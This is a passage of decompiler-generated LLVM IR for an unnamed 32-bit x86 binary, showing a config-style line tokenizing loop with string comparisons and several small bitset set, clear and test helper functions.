  %v4_80513d9 = icmp eq i8 %v2_80513d7, 0
  br i1 %v4_80513d9, label %dec_label_pc_805154a, label %dec_label_pc_80513e1

dec_label_pc_80513e1:                             ; preds = %dec_label_pc_80513e1.lr.ph, %dec_label_pc_80513d6
  %v6_80513d757 = phi i32 [ %v6_80513d751, %dec_label_pc_80513e1.lr.ph ], [ %v6_80513d7, %dec_label_pc_80513d6 ]
  %v2_80513d756 = phi i8 [ %v2_80513d748, %dec_label_pc_80513e1.lr.ph ], [ %v2_80513d7, %dec_label_pc_80513d6 ]
  %v1_80513d755 = phi i8* [ %v1_80513d747, %dec_label_pc_80513e1.lr.ph ], [ %v1_80513d7, %dec_label_pc_80513d6 ]
  %v0_80513d654 = phi i32 [ %v0_80513d7.pre, %dec_label_pc_80513e1.lr.ph ], [ %v1_80513d6, %dec_label_pc_80513d6 ]
  store i32 %v0_80513e1.pre, i32* @eax, align 4
  %v2_80513e6 = sext i8 %v2_80513d756 to i32
  store i32 %v2_80513e6, i32* @edx, align 4
  %v2_80513e9 = mul nsw i32 %v2_80513e6, 2
  %v3_80513e9 = add i32 %v0_80513e1.pre, %v2_80513e9
  %v4_80513e9 = inttoptr i32 %v3_80513e9 to i8*
  %v5_80513e9 = load i8, i8* %v4_80513e9, align 1
  %v6_80513e9 = and i8 %v5_80513e9, 32
  %v7_80513e9 = icmp eq i8 %v6_80513e9, 0
  %v1_80513ed = icmp eq i1 %v7_80513e9, false
  br i1 %v1_80513ed, label %dec_label_pc_80513d6, label %dec_label_pc_80513ef

dec_label_pc_80513ef:                             ; preds = %dec_label_pc_80513e1
  %v10_80513ef = icmp eq i8 %v2_80513d756, 10
  br i1 %v10_80513ef, label %dec_label_pc_805154a, label %dec_label_pc_80513f8

dec_label_pc_80513f8:                             ; preds = %dec_label_pc_80513ef
  %v10_80513f8 = icmp eq i8 %v2_80513d756, 35
  %v1_8051403 = icmp eq i1 %v10_80513f8, false
  br i1 %v1_8051403, label %dec_label_pc_8051454.preheader, label %dec_label_pc_805154a

dec_label_pc_8051454.preheader:                   ; preds = %dec_label_pc_80513f8
  %v2_80514544 = load i8, i8* %v1_80513d755, align 1
  %v3_80514545 = icmp eq i8 %v2_80514544, 0
  br i1 %v3_80514545, label %dec_label_pc_8051460, label %dec_label_pc_8051459

dec_label_pc_805140a:                             ; preds = %dec_label_pc_8051459
  store i32 %stack_var_-196.011, i32* @eax, align 4
  %v1_805140e = load i32, i32* @esp, align 4
  %v3_805140e = mul nuw nsw i32 %stack_var_-196.011, 4
  %v4_805140e = add nuw nsw i32 %v3_805140e, 152
  %v5_805140e = add i32 %v4_805140e, %v1_805140e
  %v6_805140e = inttoptr i32 %v5_805140e to i32*
  store i32 %v0_805140e, i32* %v6_805140e, align 4
  %v0_8051418.pre = load i32, i32* @ebx, align 4
  %v4_8051418.pre = load i32, i32* @ecx, align 4
  %v1_805141858 = inttoptr i32 %v0_8051418.pre to i8*
  %v2_805141859 = load i8, i8* %v1_805141858, align 1
  %v3_805141860 = zext i8 %v2_805141859 to i32
  %v5_805141861 = and i32 %v4_8051418.pre, -256
  %v6_805141862 = or i32 %v3_805141860, %v5_805141861
  %v4_805141a63 = icmp eq i8 %v2_805141859, 0
  br i1 %v4_805141a63, label %dec_label_pc_8051437.preheader, label %dec_label_pc_805141e.lr.ph

dec_label_pc_805141e.lr.ph:                       ; preds = %dec_label_pc_805140a
  %v0_805141e.pre = load i32, i32* @global_var_8056440, align 64
  br label %dec_label_pc_805141e

dec_label_pc_8051417:                             ; preds = %dec_label_pc_805142c
  %v1_8051417 = add i32 %v0_805141765, 1
  store i32 %v1_8051417, i32* @ebx, align 4
  %v1_8051418 = inttoptr i32 %v1_8051417 to i8*
  %v2_8051418 = load i8, i8* %v1_8051418, align 1
  %v3_8051418 = zext i8 %v2_8051418 to i32
  %v5_8051418 = and i32 %v6_805141867, -256
  %v6_8051418 = or i32 %v3_8051418, %v5_8051418
  %v4_805141a = icmp eq i8 %v2_8051418, 0
  br i1 %v4_805141a, label %dec_label_pc_8051437.preheader, label %dec_label_pc_805141e

dec_label_pc_805141e:                             ; preds = %dec_label_pc_805141e.lr.ph, %dec_label_pc_8051417
  %v6_805141867 = phi i32 [ %v6_805141862, %dec_label_pc_805141e.lr.ph ], [ %v6_8051418, %dec_label_pc_8051417 ]
  %v2_805141866 = phi i8 [ %v2_805141859, %dec_label_pc_805141e.lr.ph ], [ %v2_8051418, %dec_label_pc_8051417 ]
  %v0_805141765 = phi i32 [ %v0_8051418.pre, %dec_label_pc_805141e.lr.ph ], [ %v1_8051417, %dec_label_pc_8051417 ]
  store i32 %v0_805141e.pre, i32* @eax, align 4
  %v2_8051423 = sext i8 %v2_805141866 to i32
  store i32 %v2_8051423, i32* @edx, align 4
  %v2_8051426 = mul nsw i32 %v2_8051423, 2
  %v3_8051426 = add i32 %v0_805141e.pre, %v2_8051426
  %v4_8051426 = inttoptr i32 %v3_8051426 to i8*
  %v5_8051426 = load i8, i8* %v4_8051426, align 1
  %v6_8051426 = and i8 %v5_8051426, 32
  %v7_8051426 = icmp eq i8 %v6_8051426, 0
  %v1_805142a = icmp eq i1 %v7_8051426, false
  br i1 %v1_805142a, label %dec_label_pc_8051437.preheader, label %dec_label_pc_805142c

dec_label_pc_805142c:                             ; preds = %dec_label_pc_805141e
  %v10_805142c = icmp eq i8 %v2_805141866, 10
  %v1_805142f = icmp eq i1 %v10_805142c, false
  br i1 %v1_805142f, label %dec_label_pc_8051417, label %dec_label_pc_8051437.preheader

dec_label_pc_8051437.preheader:                   ; preds = %dec_label_pc_805142c, %dec_label_pc_805141e, %dec_label_pc_8051417, %dec_label_pc_805140a
  %v0_8051417.lcssa = phi i32 [ %v0_8051418.pre, %dec_label_pc_805140a ], [ %v1_8051417, %dec_label_pc_8051417 ], [ %v0_805141765, %dec_label_pc_805141e ], [ %v0_805141765, %dec_label_pc_805142c ]
  %v6_8051418.lcssa = phi i32 [ %v6_805141862, %dec_label_pc_805140a ], [ %v6_8051418, %dec_label_pc_8051417 ], [ %v6_805141867, %dec_label_pc_805141e ], [ %v6_805141867, %dec_label_pc_805142c ]
  %v1_805143773 = inttoptr i32 %v0_8051417.lcssa to i8*
  %v2_805143774 = load i8, i8* %v1_805143773, align 1
  %v3_805143775 = zext i8 %v2_805143774 to i32
  %v5_805143776 = and i32 %v6_8051418.lcssa, -256
  %v6_805143777 = or i32 %v3_805143775, %v5_805143776
  store i32 %v6_805143777, i32* @ecx, align 4
  %v4_805143978 = icmp eq i8 %v2_805143774, 0
  br i1 %v4_805143978, label %dec_label_pc_8051450, label %dec_label_pc_805143d

dec_label_pc_8051433:                             ; preds = %dec_label_pc_805144b, %dec_label_pc_805143d
  store i8 0, i8* %v1_805143781, align 1
  %v0_8051436 = load i32, i32* @ebx, align 4
  %v1_8051436 = add i32 %v0_8051436, 1
  store i32 %v1_8051436, i32* @ebx, align 4
  %v4_8051437.pre = load i32, i32* @ecx, align 4
  %v1_8051437 = inttoptr i32 %v1_8051436 to i8*
  %v2_8051437 = load i8, i8* %v1_8051437, align 1
  %v3_8051437 = zext i8 %v2_8051437 to i32
  %v5_8051437 = and i32 %v4_8051437.pre, -256
  %v6_8051437 = or i32 %v3_8051437, %v5_8051437
  store i32 %v6_8051437, i32* @ecx, align 4
  %v4_8051439 = icmp eq i8 %v2_8051437, 0
  br i1 %v4_8051439, label %dec_label_pc_8051450, label %dec_label_pc_805143d

dec_label_pc_805143d:                             ; preds = %dec_label_pc_8051437.preheader, %dec_label_pc_8051433
  %v2_805143782 = phi i8 [ %v2_8051437, %dec_label_pc_8051433 ], [ %v2_805143774, %dec_label_pc_8051437.preheader ]
  %v1_805143781 = phi i8* [ %v1_8051437, %dec_label_pc_8051433 ], [ %v1_805143773, %dec_label_pc_8051437.preheader ]
  %v0_805145480 = phi i32 [ %v1_8051436, %dec_label_pc_8051433 ], [ %v0_8051417.lcssa, %dec_label_pc_8051437.preheader ]
  %v0_805143d = load i32, i32* @global_var_8056440, align 64
  store i32 %v0_805143d, i32* @eax, align 4
  %v2_8051442 = sext i8 %v2_805143782 to i32
  store i32 %v2_8051442, i32* @edx, align 4
  %v2_8051445 = mul nsw i32 %v2_8051442, 2
  %v3_8051445 = add i32 %v0_805143d, %v2_8051445
  %v4_8051445 = inttoptr i32 %v3_8051445 to i8*
  %v5_8051445 = load i8, i8* %v4_8051445, align 1
  %v6_8051445 = and i8 %v5_8051445, 32
  %v7_8051445 = icmp eq i8 %v6_8051445, 0
  %v1_8051449 = icmp eq i1 %v7_8051445, false
  br i1 %v1_8051449, label %dec_label_pc_8051433, label %dec_label_pc_805144b

dec_label_pc_805144b:                             ; preds = %dec_label_pc_805143d
  %v10_805144b = icmp eq i8 %v2_805143782, 10
  br i1 %v10_805144b, label %dec_label_pc_8051433, label %dec_label_pc_8051450

dec_label_pc_8051450:                             ; preds = %dec_label_pc_8051433, %dec_label_pc_805144b, %dec_label_pc_8051437.preheader
  %v0_8051454.lcssa = phi i32 [ %v0_8051417.lcssa, %dec_label_pc_8051437.preheader ], [ %v0_805145480, %dec_label_pc_805144b ], [ %v1_8051436, %dec_label_pc_8051433 ]
  %v1_8051437.lcssa = phi i8* [ %v1_805143773, %dec_label_pc_8051437.preheader ], [ %v1_805143781, %dec_label_pc_805144b ], [ %v1_8051437, %dec_label_pc_8051433 ]
  %v4_8051450 = add nuw nsw i32 %stack_var_-196.011, 1
  %v2_8051454 = load i8, i8* %v1_8051437.lcssa, align 1
  %v3_8051454 = icmp eq i8 %v2_8051454, 0
  br i1 %v3_8051454, label %dec_label_pc_8051460, label %dec_label_pc_8051459

dec_label_pc_8051459:                             ; preds = %dec_label_pc_8051454.preheader, %dec_label_pc_8051450
  %v0_805140e = phi i32 [ %v0_8051454.lcssa, %dec_label_pc_8051450 ], [ %v0_80513d654, %dec_label_pc_8051454.preheader ]
  %stack_var_-196.011 = phi i32 [ %v4_8051450, %dec_label_pc_8051450 ], [ 0, %dec_label_pc_8051454.preheader ]
  %v7_805145e = icmp sgt i32 %stack_var_-196.011, 4
  br i1 %v7_805145e, label %dec_label_pc_8051460, label %dec_label_pc_805140a

dec_label_pc_8051460:                             ; preds = %dec_label_pc_8051450, %dec_label_pc_8051459, %dec_label_pc_8051454.preheader
  %stack_var_-196.0.lcssa = phi i32 [ 0, %dec_label_pc_8051454.preheader ], [ %v4_8051450, %dec_label_pc_8051450 ], [ %stack_var_-196.011, %dec_label_pc_8051459 ]
  store i32 %tmp, i32* @edi, align 4
  %v0_8051467 = load i32, i32* @esi, align 4
  store i32 1, i32* @esi, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_8055047.202 to i32), i32* %stack_var_-216, align 4
  %v5_8051474 = call i32 @function_80519d8(i8* %v4_8051474, i32 ptrtoint ([11 x i8]* @global_var_8055047.202 to i32), i32 %v0_8051467, i32 %v0_8051467)
  store i32 %v5_8051474, i32* @eax, align 4
  %v1_805147c = icmp eq i32 %v5_8051474, 0
  br i1 %v1_805147c, label %dec_label_pc_80514a4.preheader, label %dec_label_pc_80514b5

dec_label_pc_80514a4.preheader:                   ; preds = %dec_label_pc_8051460
  %v0_80514a487 = load i32, i32* @esi, align 4
  %v5_80514a892 = icmp slt i32 %v0_80514a487, %stack_var_-196.0.lcssa
  br i1 %v5_80514a892, label %dec_label_pc_80514aa.lr.ph, label %dec_label_pc_80514b5

dec_label_pc_80514aa.lr.ph:                       ; preds = %dec_label_pc_80514a4.preheader
  %v0_80514aa.pre = load i32, i32* @global_var_8059134.138, align 4
  br label %dec_label_pc_80514aa

dec_label_pc_8051482:                             ; preds = %dec_label_pc_80514aa
  %v2_8051485 = mul i32 %v0_80514a493, 4
  %v4_8051485 = add i32 %v2_8051485, %v3_8051485
  %v5_8051485 = inttoptr i32 %v4_8051485 to i32*
  %v6_8051485 = load i32, i32* %v5_8051485, align 4
  %v1_805148c = add i32 %v0_80514a493, 1
  store i32 %v1_805148c, i32* @esi, align 4
  %v1_805148d = call i32 @function_804d694(i32 %v6_8051485)
  %v1_8051495 = load i32, i32* @ebx, align 4
  %v2_8051495 = mul i32 %v1_8051495, 4
  %v3_8051495 = add i32 %v2_8051495, 134582568
  %v4_8051495 = inttoptr i32 %v3_8051495 to i32*
  store i32 %v1_805148d, i32* %v4_8051495, align 4
  %v0_805149c = load i32, i32* @ebx, align 4
  %v1_805149c = add i32 %v0_805149c, 1
  store i32 %v1_805149c, i32* @eax, align 4
  store i32 %v1_805149c, i32* @global_var_8059134.138, align 4
  %v0_80514a4 = load i32, i32* @esi, align 4
  %v5_80514a8 = icmp slt i32 %v0_80514a4, %stack_var_-196.0.lcssa
  br i1 %v5_80514a8, label %dec_label_pc_80514aa, label %dec_label_pc_80514b5

dec_label_pc_80514aa:                             ; preds = %dec_label_pc_80514aa.lr.ph, %dec_label_pc_8051482
  %v0_80514aa = phi i32 [ %v0_80514aa.pre, %dec_label_pc_80514aa.lr.ph ], [ %v1_805149c, %dec_label_pc_8051482 ]
  %v0_80514a493 = phi i32 [ %v0_80514a487, %dec_label_pc_80514aa.lr.ph ], [ %v0_80514a4, %dec_label_pc_8051482 ]
  store i32 %v0_80514aa, i32* @ebx, align 4
  %v7_80514b3 = icmp sgt i32 %v0_80514aa, 2
  br i1 %v7_80514b3, label %dec_label_pc_80514b5, label %dec_label_pc_8051482

dec_label_pc_80514b5:                             ; preds = %dec_label_pc_80514a4.preheader, %dec_label_pc_8051482, %dec_label_pc_80514aa, %dec_label_pc_8051460
  %v0_80514b5 = load i32, i32* @ebx, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_8055052.203 to i32), i32* %stack_var_-216, align 4
  %v0_80514bc = load i32, i32* @edi, align 4
  %v4_80514bd = inttoptr i32 %v0_80514bc to i8*
  %v5_80514bd = call i32 @function_80519d8(i8* %v4_80514bd, i32 ptrtoint ([7 x i8]* @global_var_8055052.203 to i32), i32 %v0_80514b5, i32 %v0_80514b5)
  store i32 %v5_80514bd, i32* @eax, align 4
  %v1_80514c5 = icmp eq i32 %v5_80514bd, 0
  br i1 %v1_80514c5, label %dec_label_pc_8051507.preheader, label %dec_label_pc_80514c9

dec_label_pc_80514c9:                             ; preds = %dec_label_pc_80514b5
  %v0_80514c9 = load i32, i32* @ecx, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_8055059.204 to i32), i32* %stack_var_-216, align 4
  %v0_80514d0 = load i32, i32* @edi, align 4
  %v4_80514d1 = inttoptr i32 %v0_80514d0 to i8*
  %v5_80514d1 = call i32 @function_80519d8(i8* %v4_80514d1, i32 ptrtoint ([7 x i8]* @global_var_8055059.204 to i32), i32 %v0_80514c9, i32 %v0_80514c9)
  %v1_80514d9 = icmp eq i32 %v5_80514d1, 0
  br i1 %v1_80514d9, label %dec_label_pc_8051507.preheader, label %dec_label_pc_805154a

dec_label_pc_8051507.preheader:                   ; preds = %dec_label_pc_80514b5, %dec_label_pc_80514c9
  %v0_805150794 = load i32, i32* @global_var_8059138.197, align 8
  %tmp4197 = icmp slt i32 %v0_805150794, 1
  %tmp4298 = icmp eq i1 %tmp4197, false
  br i1 %tmp4298, label %dec_label_pc_80514df, label %dec_label_pc_8051510

dec_label_pc_80514df:                             ; preds = %dec_label_pc_8051507.preheader, %dec_label_pc_80514df.dec_label_pc_80514df_crit_edge
  %v0_805150799 = phi i32 [ %v0_8051507, %dec_label_pc_80514df.dec_label_pc_80514df_crit_edge ], [ %v0_805150794, %dec_label_pc_8051507.preheader ]
  %v1_80514df = add i32 %v0_805150799, -1
  %v1_80514e3 = mul i32 %v1_80514df, 4
  %v2_80514e3 = add i32 %v1_80514e3, 134582552
  %v3_80514e3 = inttoptr i32 %v2_80514e3 to i32*
  %v4_80514e3 = load i32, i32* %v3_80514e3, align 4
  store i32 %v1_80514df, i32* @global_var_8059138.197, align 8
  %v1_80514ef = call i32 @function_804eac9(i32 %v4_80514e3)
  %v0_80514f4 = load i32, i32* @global_var_8059138.197, align 8
  %v1_80514fc = mul i32 %v0_80514f4, 4
  %v2_80514fc = add i32 %v1_80514fc, ptrtoint (i32* @global_var_8059118.205 to i32)
  %v3_80514fc = inttoptr i32 %v2_80514fc to i32*
  store i32 0, i32* %v3_80514fc, align 4
  %v0_8051507 = load i32, i32* @global_var_8059138.197, align 8
  %tmp41 = icmp slt i32 %v0_8051507, 1
  %tmp42 = icmp eq i1 %tmp41, false
  br i1 %tmp42, label %dec_label_pc_80514df.dec_label_pc_80514df_crit_edge, label %dec_label_pc_8051510

dec_label_pc_80514df.dec_label_pc_80514df_crit_edge: ; preds = %dec_label_pc_80514df
  br label %dec_label_pc_80514df

dec_label_pc_8051510:                             ; preds = %dec_label_pc_80514df, %dec_label_pc_8051507.preheader
  %v0_8051507.lcssa = phi i32 [ %v0_805150794, %dec_label_pc_8051507.preheader ], [ %v0_8051507, %dec_label_pc_80514df ]
  store i32 1, i32* @esi, align 4
  %v5_805153d105 = icmp sgt i32 %stack_var_-196.0.lcssa, 1
  br i1 %v5_805153d105, label %dec_label_pc_805153f, label %dec_label_pc_805154a

dec_label_pc_8051517:                             ; preds = %dec_label_pc_805153f
  %v2_805151a = mul i32 %v0_8051521107, 4
  %v4_805151a = add i32 %v2_805151a, %v3_8051485
  %v5_805151a = inttoptr i32 %v4_805151a to i32*
  %v6_805151a = load i32, i32* %v5_805151a, align 4
  %v1_8051521 = add i32 %v0_8051521107, 1
  store i32 %v1_8051521, i32* @esi, align 4
  %v1_8051522 = call i32 @function_804d694(i32 %v6_805151a)
  %v1_805152a = load i32, i32* @ebx, align 4
  %v2_805152a = mul i32 %v1_805152a, 4
  %v3_805152a = add i32 %v2_805152a, 134582552
  %v4_805152a = inttoptr i32 %v3_805152a to i32*
  store i32 %v1_8051522, i32* %v4_805152a, align 4
  %v0_8051531 = load i32, i32* @ebx, align 4
  %v1_8051531 = add i32 %v0_8051531, 1
  store i32 %v1_8051531, i32* @global_var_8059138.197, align 8
  %v0_8051539.pre = load i32, i32* @esi, align 4
  %v5_805153d = icmp slt i32 %v0_8051539.pre, %stack_var_-196.0.lcssa
  br i1 %v5_805153d, label %dec_label_pc_805153f, label %dec_label_pc_805154a

dec_label_pc_805153f:                             ; preds = %dec_label_pc_8051510, %dec_label_pc_8051517
  %v0_8051521107 = phi i32 [ %v0_8051539.pre, %dec_label_pc_8051517 ], [ 1, %dec_label_pc_8051510 ]
  %v0_805153f106 = phi i32 [ %v1_8051531, %dec_label_pc_8051517 ], [ %v0_8051507.lcssa, %dec_label_pc_8051510 ]
  store i32 %v0_805153f106, i32* @ebx, align 4
  %v7_8051548 = icmp sgt i32 %v0_805153f106, 3
  br i1 %v7_8051548, label %dec_label_pc_805154a, label %dec_label_pc_8051517

dec_label_pc_805154a:                             ; preds = %dec_label_pc_80513d7.preheader, %dec_label_pc_80513d6, %dec_label_pc_8051510, %dec_label_pc_805153f, %dec_label_pc_8051517, %dec_label_pc_80514c9, %dec_label_pc_80513f8, %dec_label_pc_80513ef, %dec_label_pc_805154a.preheader
  %v0_805154a = load i32, i32* @edx, align 4
  store i32 128, i32* %stack_var_-216, align 4
  store i32 %v2_8051551, i32* @ebx, align 4
  %v3_8051556 = call i32 @function_804cf58(i32 %v2_8051551, i32 128, i32 %v0_805154a)
  store i32 %v3_8051556, i32* @eax, align 4
  %v1_805155e = icmp eq i32 %v3_8051556, 0
  %v1_8051560 = icmp eq i1 %v1_805155e, false
  br i1 %v1_8051560, label %dec_label_pc_80513d7.preheader, label %dec_label_pc_8051566

dec_label_pc_80513d7.preheader:                   ; preds = %dec_label_pc_805154a
  %v0_80513d7.pre = load i32, i32* @ebx, align 4
  %v4_80513d7.pre = load i32, i32* @ecx, align 4
  %v1_80513d747 = inttoptr i32 %v0_80513d7.pre to i8*
  %v2_80513d748 = load i8, i8* %v1_80513d747, align 1
  %v3_80513d749 = zext i8 %v2_80513d748 to i32
  %v5_80513d750 = and i32 %v4_80513d7.pre, -256
  %v6_80513d751 = or i32 %v3_80513d749, %v5_80513d750
  store i32 %v6_80513d751, i32* @ecx, align 4
  %v4_80513d952 = icmp eq i8 %v2_80513d748, 0
  br i1 %v4_80513d952, label %dec_label_pc_805154a, label %dec_label_pc_80513e1.lr.ph

dec_label_pc_80513e1.lr.ph:                       ; preds = %dec_label_pc_80513d7.preheader
  %v0_80513e1.pre = load i32, i32* @global_var_8056440, align 64
  br label %dec_label_pc_80513e1

dec_label_pc_8051566:                             ; preds = %dec_label_pc_805154a
  %v0_8051569 = load i32, i32* @ebp, align 4
  %v1_805156a = inttoptr i32 %v0_8051569 to i16*
  %v2_805156a = call i32 @function_804baac(i16* %v1_805156a)
  br label %dec_label_pc_805157f

dec_label_pc_8051574:                             ; preds = %dec_label_pc_80513b3
  %v0_8051574 = call i32 @function_804fe9c()
  %v1_8051579 = inttoptr i32 %v0_8051574 to i32*
  store i32 3, i32* %v1_8051579, align 4
  br label %dec_label_pc_805157f

dec_label_pc_805157f:                             ; preds = %dec_label_pc_8051358, %dec_label_pc_8051566, %dec_label_pc_8051574
  store i32 1, i32* %stack_var_-216, align 4
  store i32 %v2_805136c, i32* @eax, align 4
  %v2_805158b = call i32 @function_804f65e(i32 %v2_805136c, i32 1)
  store i32 %v0_8051358, i32* @ebp, align 4
  ret i32 %v2_805158b

; uselistorder directives
  uselistorder i32 %v0_80513e1.pre, { 1, 0 }
  uselistorder i32 %v6_80513d751, { 1, 0 }
  uselistorder i8 %v2_80513d748, { 1, 2, 0 }
  uselistorder i8* %v1_80513d747, { 1, 0 }
  uselistorder i32 %v0_80513d7.pre, { 1, 0 }
  uselistorder i32 %v0_8051507, { 0, 2, 1 }
  uselistorder i32 %v0_80514aa, { 1, 0 }
  uselistorder i32 %stack_var_-196.0.lcssa, { 3, 0, 2, 1 }
  uselistorder i32 %stack_var_-196.011, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v2_8051442, { 1, 0 }
  uselistorder i32 %v2_8051423, { 1, 0 }
  uselistorder i32 %v1_8051417, { 0, 2, 1, 3 }
  uselistorder i32 %v2_80513e6, { 1, 0 }
  uselistorder i32 %v1_80513d6, { 1, 0, 2 }
  uselistorder i32* %stack_var_-216, { 0, 1, 2, 3, 4, 5, 6, 8, 7 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 ()* @function_804fe9c, { 5, 4, 2, 1, 0, 3 }
  uselistorder i32 (i32)* @function_804eac9, { 17, 16, 15, 14, 13, 12, 11, 10, 25, 24, 23, 22, 1, 9, 8, 7, 6, 5, 4, 3, 19, 18, 2, 21, 20, 0 }
  uselistorder i32* @global_var_8059138.197, { 1, 2, 3, 4, 0, 5, 6, 7 }
  uselistorder i32 152, { 1, 0, 2, 3 }
  uselistorder i8 10, { 0, 1, 2, 12, 3, 4, 5, 6, 7, 13, 11, 8, 9, 10 }
  uselistorder i32 164, { 1, 0 }
  uselistorder i32* @global_var_8059134.138, { 1, 0, 2, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_8056450.137 to i32), { 1, 3, 4, 5, 6, 7, 8, 0, 2, 9 }
  uselistorder label %dec_label_pc_805157f, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805154a, { 0, 3, 4, 2, 5, 6, 7, 1, 8 }
  uselistorder label %dec_label_pc_805153f, { 1, 0 }
  uselistorder label %dec_label_pc_80514df, { 1, 0 }
  uselistorder label %dec_label_pc_8051507.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_80514b5, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_80514aa, { 1, 0 }
  uselistorder label %dec_label_pc_8051460, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051459, { 1, 0 }
  uselistorder label %dec_label_pc_8051450, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805143d, { 1, 0 }
  uselistorder label %dec_label_pc_805141e, { 1, 0 }
  uselistorder label %dec_label_pc_805154a.preheader, { 1, 0 }
}

define i32 @function_805159c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_805159c:
  %v9_80515bf = inttoptr i32 %arg3 to i32*
  %v10_80515bf = call i32 @function_80522ed(i32 0, i32 %arg1, i32 %arg2, i32 0, i32* %v9_80515bf, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7)
  ret i32 %v10_80515bf
}

define i32 @function_80515c8() local_unnamed_addr {
dec_label_pc_80515c8:
  %stack_var_-16 = alloca i32, align 4
  %v2_80515eb = ptrtoint i32* %stack_var_-16 to i32
  %v2_80515f2 = call i32 @function_804f9b0(i32 9, i32 %v2_80515eb)
  ret i32 %v2_80515f2

; uselistorder directives
  uselistorder i32 (i32, i32)* @function_804f9b0, { 6, 4, 8, 7, 3, 2, 5, 1, 0 }
}

define i32 @function_80515fc(i32 %arg1) local_unnamed_addr {
dec_label_pc_80515fc:
  %v0_80515ff = call i32 @function_804b8fc()
  %v2_805160b = call i32 @function_804b98c(i32 %v0_80515ff, i32 %arg1)
  ret i32 %v2_805160b
}

define i32 @function_8051614(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8051614:
  %v1_8051622 = add i32 %arg2, -1
  %v1_8051625 = urem i32 %v1_8051622, 32
  %v2_8051625 = icmp eq i32 %v1_8051625, 0
  %v2_8051628 = udiv i32 %v1_8051622, 32
  br i1 %v2_8051625, label %bb5, label %bb

bb:                                               ; preds = %dec_label_pc_8051614
  %v5_805162b = shl i32 1, %v1_8051625
  br label %bb5

bb5:                                              ; preds = %dec_label_pc_8051614, %bb
  %v6_805162d = phi i32 [ 1, %dec_label_pc_8051614 ], [ %v5_805162b, %bb ]
  %v2_805162d = mul nuw nsw i32 %v2_8051628, 4
  %v3_805162d = add i32 %v2_805162d, %arg1
  %v4_805162d = inttoptr i32 %v3_805162d to i32*
  %v5_805162d = load i32, i32* %v4_805162d, align 4
  %v7_805162d = and i32 %v5_805162d, %v6_805162d
  %v8_805162d = icmp eq i32 %v7_805162d, 0
  %v1_8051631 = icmp eq i1 %v8_805162d, false
  %v2_8051631 = zext i1 %v1_8051631 to i32
  ret i32 %v2_8051631

; uselistorder directives
  uselistorder i32 %v1_8051625, { 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @function_8051638(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8051638:
  %stack_var_-4 = alloca i32, align 4
  %v0_8051638 = load i32, i32* @ebx, align 4
  store i32 %v0_8051638, i32* %stack_var_-4, align 4
  %v1_8051646 = add i32 %arg2, -1
  %v1_8051649 = urem i32 %v1_8051646, 32
  %v2_8051649 = icmp eq i32 %v1_8051649, 0
  store i32 %v1_8051649, i32* @ecx, align 4
  br i1 %v2_8051649, label %bb6, label %bb

bb:                                               ; preds = %dec_label_pc_8051638
  %v5_805164c = shl i32 1, %v1_8051649
  br label %bb6

bb6:                                              ; preds = %dec_label_pc_8051638, %bb
  %v6_8051651 = phi i32 [ 1, %dec_label_pc_8051638 ], [ %v5_805164c, %bb ]
  %v2_805164e = udiv i32 %v1_8051646, 32
  store i32 %v2_805164e, i32* @edx, align 4
  %v2_8051651 = mul nuw nsw i32 %v2_805164e, 4
  %v3_8051651 = add i32 %v2_8051651, %arg1
  %v4_8051651 = inttoptr i32 %v3_8051651 to i32*
  %v5_8051651 = load i32, i32* %v4_8051651, align 4
  %v7_8051651 = or i32 %v5_8051651, %v6_8051651
  store i32 %v7_8051651, i32* %v4_8051651, align 4
  %v2_8051656 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051656, i32* @ebx, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_805164e, { 1, 0 }
  uselistorder i32 %v1_8051649, { 2, 1, 0 }
  uselistorder label %bb6, { 1, 0 }
}

define i32 @function_8051658(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8051658:
  %v1_8051666 = add i32 %arg2, -1
  %v1_8051669 = urem i32 %v1_8051666, 32
  %v2_8051669 = icmp eq i32 %v1_8051669, 0
  br i1 %v2_8051669, label %bb6, label %bb

bb:                                               ; preds = %dec_label_pc_8051658
  %v4_805166c = shl i32 -2, %v1_8051669
  %v5_805166c = sub nsw i32 32, %v1_8051669
  %v6_805166c = lshr i32 -2, %v5_805166c
  %v7_805166c = or i32 %v6_805166c, %v4_805166c
  br label %bb6

bb6:                                              ; preds = %dec_label_pc_8051658, %bb
  %v6_8051671 = phi i32 [ -2, %dec_label_pc_8051658 ], [ %v7_805166c, %bb ]
  %v2_805166e = udiv i32 %v1_8051666, 32
  %v2_8051671 = mul nuw nsw i32 %v2_805166e, 4
  %v3_8051671 = add i32 %v2_8051671, %arg1
  %v4_8051671 = inttoptr i32 %v3_8051671 to i32*
  %v5_8051671 = load i32, i32* %v4_8051671, align 4
  %v7_8051671 = and i32 %v5_8051671, %v6_8051671
  store i32 %v7_8051671, i32* %v4_8051671, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_8051669, { 1, 2, 0 }
  uselistorder i32 -2, { 4, 6, 5, 3, 7, 0, 18, 19, 1, 15, 16, 14, 17, 21, 2, 8, 9, 10, 20, 11, 12, 13 }
  uselistorder label %bb6, { 1, 0 }
}

define i32 @function_8051678() local_unnamed_addr {
dec_label_pc_8051678:
  %v0_8051678 = load i32, i32* @eax, align 4
  %v1_8051678 = add i32 %v0_8051678, 28
  %v2_8051678 = inttoptr i32 %v1_8051678 to i32*
  %v3_8051678 = load i32, i32* %v2_8051678, align 4
  store i32 %v3_8051678, i32* @global_var_805913c.206, align 4
  %v1_8051681 = add i32 %v0_8051678, 44
  %v2_8051681 = inttoptr i32 %v1_8051681 to i32*
